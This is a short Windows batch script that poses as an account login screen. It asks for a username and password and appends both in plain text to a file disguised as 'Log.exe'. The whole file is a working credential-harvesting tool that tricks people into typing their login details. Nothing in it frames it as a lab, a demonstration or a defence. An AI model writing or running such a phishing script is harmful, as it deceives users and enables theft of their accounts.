@echo off 
color 0c
echo Enter The The User Name And Password To Login Into Your Account
echo.
echo _____________________________________________________________
set /p user=Username:
set /p password=Password:
echo Username="%user%" Password="%password%" >>Log.exe

pause